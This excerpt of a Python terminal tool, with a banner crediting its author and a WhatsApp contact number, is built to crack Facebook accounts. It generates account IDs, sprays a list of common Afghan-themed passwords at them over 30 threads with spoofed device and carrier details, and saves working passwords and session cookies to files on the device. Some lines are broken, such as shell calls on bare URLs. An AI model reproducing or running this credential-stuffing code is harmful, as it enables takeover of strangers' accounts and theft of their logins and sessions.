...
=======================================================
\033[1;31m====================================================
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mAUTHER     \033[1;31m┇\033[31;47m{edris safi}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mFACEBOOK   \033[1;31m┇\033[37;41m{edris safi}\33[0;m        
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mGITHUB    \033[1;31m ┇\033[1;37m{edris safi}\33[0;m              
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mYOUTUBE   \033[1;31m ┇\033[1;37m{edris safi}\33[0;m      
\033[1;33m⟪𒋨⟫══╣\033[1;37m \033[1;32mWHATSAPP \33[1;31m  ┇\033[31;47m{+93796345081 }\33[0;m
...
\033[1;31m====================================================
\33[37;41m\t WELLCOME TO edris safi TOOLS\33[0;m
\033[1;33m========= \33[32;33mAFG ≠ 2024 ≠ 64Bit\33[1;33m =========""")
def linex():
	print('\033[1;37m----------------------------------------------')
def clear():
	os.system('clear')
...
def FKING():
		...
		#	linex()
			...
			if jf in ['1','01']:
			 ...
			 os.system('https://www.facebook.com/profile.php?id=100070605271290')
			elif jf in ['3','03']:
			 os.system('https://t.me/cartoon_for_baby')
			elif jf in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def AFG():
		...
		with tred(max_workers=30) as FKING:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'۱۲۳۴۵۶','100200','۱۲۳۴۵۶۷۸۹','111222333','sana12345','queen12345','900900','10002000','50006000','۵۰۰۶۰۰','kabul123','Afghan12345','kabul12345','afghanistan','Afghan123','janjan','afghan','Afghanistan','50005000','jan123','edris','kapisa12345','pubg12345','12345678',]
...
AJOKER1 = [ 'MTN', 'AWCC', 'Roshan', 'Etisalat']
AJOKER = random.choice(AJOKER1)
def fking1(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        fblc = device['fblc']
                        fbcr = sim_id
                        Fjj=random.choice(AJOKER)
                        Fjjj=random.choice(AJOKER)
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[31;47m [JOKER==>OK]\33[0;m\033[1;32m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print('\r\r\033[31;47m'"Cookie:\33[0;m\033[1;32m "+coki)
                                        open('/sdcard/-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/edris88-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[37;41m [JOKER==>CP]\33[0;m '+str(uid)+' | '+pas+'\033[1;97m')
                                        print("")
                                        open('/sdcard/edris88-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
